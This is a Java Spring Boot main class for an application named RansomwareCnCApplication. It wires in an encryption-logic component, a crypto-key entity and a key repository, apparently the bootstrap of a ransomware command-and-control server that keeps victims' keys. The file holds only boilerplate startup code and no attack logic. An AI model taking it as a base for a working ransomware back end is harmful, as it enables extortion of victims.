package server;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.autoconfigure.domain.EntityScan;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.data.jpa.repository.config.EnableJpaRepositories;

@SpringBootApplication
@ComponentScan({ "server.bl.EncryptionLogic" })
@EntityScan("server.entites.CryptoKey")
@EnableJpaRepositories("server.repositories.KeyRepository")
public class RansomwareCnCApplication {

	public static void main(String[] args) {

		 SpringApplication.run(RansomwareCnCApplication.class, args);

	

	}

}
